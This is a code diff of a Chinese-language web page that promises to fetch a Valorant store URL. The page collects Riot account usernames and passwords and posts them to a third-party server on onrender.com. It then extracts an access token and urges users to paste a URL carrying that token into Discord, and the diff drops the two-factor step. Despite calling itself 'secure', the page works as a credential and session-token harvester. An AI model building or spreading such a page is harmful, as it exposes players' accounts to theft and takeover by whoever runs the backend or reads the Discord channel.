@@ -29,23 +29,15 @@
     <div class="subtitle">放棄麻煩的書籤！輸入帳密一鍵極速獲取網址</div>
     
     <div id="loginForm">
-        <div id="credentialsArea">
-            <div class="input-group">
-                <label>RIOT 登入帳號 (Username)</label>
-                <input type="text" id="username" placeholder="請輸入遊戲登入帳號...">
-            </div>
-            <div class="input-group">
-                <label>RIOT 登入密碼 (Password)</label>
-                <input type="password" id="password" placeholder="請輸入遊戲登入密碼...">
-            </div>
+        <div class="input-group">
+            <label>RIOT 登入帳號 (Username)</label>
+            <input type="text" id="username" placeholder="請輸入遊戲登入帳號...">
         </div>
-        
-        <div class="input-group" id="mfaGroup" style="display: none;">
-            <label style="color: #00ffcc; font-weight: bold;">🔒 請輸入電子郵件收到的 6 位數二步驟驗證碼</label>
-            <input type="text" id="mfaCode" placeholder="請輸入 6 位數代碼...">
+        <div class="input-group">
+            <label>RIOT 登入密碼 (Password)</label>
+            <input type="password" id="password" placeholder="請輸入遊戲登入密碼...">
         </div>
-
-        <button class="btn" id="submitBtn" onclick="processAuth()">➔ 一鍵安全獲取商店網址</button>
+        <button class="btn" id="submitBtn" onclick="startAuth()">➔ 一鍵安全獲取商店網址</button>
         <div class="status-msg" id="statusMsg"></div>
     </div>
 
@@ -58,92 +50,57 @@
 
 <script>
 const BACKEND_URL = "https://zenith-auth-daily.onrender.com";
-let currentStage = "LOGIN";
 
-async function processAuth() {
+async function startAuth() {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value.trim();
     const btn = document.getElementById('submitBtn');
     const statusMsg = document.getElementById('statusMsg');
     
+    if(!user || !pass) { alert('請填寫帳號和密碼！'); return; }
+    
     btn.disabled = true;
+    statusMsg.innerText = "⏳ 正在啟動後端轉接橋樑...";
 
-    if (currentStage === "LOGIN") {
-        const user = document.getElementById('username').value.trim();
-        const pass = document.getElementById('password').value.trim();
-        if(!user || !pass) { alert('請填寫帳號和密碼！'); btn.disabled = false; return; }
+    try {
+        let initRes = await fetch(`${BACKEND_URL}/api/auth/init`, { method: "POST" });
+        statusMsg.innerText = "🔑 正在將憑證送往 Riot 伺服器驗證...";
 
-        statusMsg.innerText = "🔑 正在向 Riot 伺服器提交憑證驗證...";
-        try {
-            // 關鍵修改：加上 credentials: "include" 讓跨網域安全傳輸 Cookie 生效
-            let res = await fetch(`${BACKEND_URL}/api/auth/login`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username: user, password: pass }),
-                credentials: "include"
-            });
-            let data = await res.json();
-            handleResponse(data);
-        } catch (err) {
-            alert("連線後端發生錯誤！");
+        let loginRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username: user, password: pass })
+        });
+        
+        let data = await loginRes.json();
+
+        if (data.response && data.response.parameters && data.response.parameters.uri) {
+            let originalUri = data.response.parameters.uri;
+            let match = originalUri.match(/access_token=([^&]+)/);
+            if (match) {
+                document.getElementById('outputUrl').value = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + match[1];
+                document.getElementById('resultBox').style.display = "block";
+                document.getElementById('loginForm').style.display = "none";
+                statusMsg.innerText = "";
+            }
+        } else {
+            alert("登入失敗：請檢查帳密是否正確。若你有開啟二步驟驗證，此自動網頁不支援，請改用手動或書籤方式。");
             btn.disabled = false;
+            statusMsg.innerText = "❌ 驗證失敗";
         }
-    } else if (currentStage === "MFA") {
-        const mfa = document.getElementById('mfaCode').value.trim();
-        if(!mfa) { alert('請輸入驗證碼！'); btn.disabled = false; return; }
-
-        statusMsg.innerText = "⏳ 正在送出二步驟驗證碼...";
-        try {
-            let res = await fetch(`${BACKEND_URL}/api/auth/mfa`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ code: mfa }),
-                credentials: "include"
-            });
-            let data = await res.json();
-            handleResponse(data);
-        } catch (err) {
-            alert("驗證碼發送錯誤！");
-            btn.disabled = false;
-        }
-    }
-}
-
-function handleResponse(data) {
-    const btn = document.getElementById('submitBtn');
-    const statusMsg = document.getElementById('statusMsg');
-
-    if (data.response && data.response.parameters && data.response.parameters.uri) {
-        let originalUri = data.response.parameters.uri;
-        let match = originalUri.match(/access_token=([^&]+)/);
-        if (match) {
-            document.getElementById('outputUrl').value = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + match[1];
-            document.getElementById('resultBox').style.display = "block";
-            document.getElementById('loginForm').style.display = "none";
-            statusMsg.innerText = "";
-        }
-        return;
-    }
-
-    if (data.type === "mfa" || data.error === "mfa_required") {
-        document.getElementById('credentialsArea').style.display = "none";
-        document.getElementById('mfaGroup').style.display = "block";
-        statusMsg.innerText = "🔒 偵測到驗證保護！請至信箱收信，打上 6 位數驗證碼後再次點擊按鈕！";
-        currentStage = "MFA";
+    } catch (err) {
+        alert("連線發生錯誤，請確認後端狀態！");
         btn.disabled = false;
-        return;
+        statusMsg.innerText = "❌ 連線失敗";
     }
-
-    alert("驗證失敗：請檢查輸入是否正確，或重新整理再試一次。");
-    btn.disabled = false;
-    statusMsg.innerText = "❌ 驗證失敗";
 }
 
 function copyResult() {
     let t = document.getElementById('outputUrl');
     t.select();
     document.execCommand('copy');
-    alert('🎉 複製成功！');
+    alert('🎉 複製成功！快回 Discord 貼上吧！');
 }
 </script>
-
 </body>
 </html>
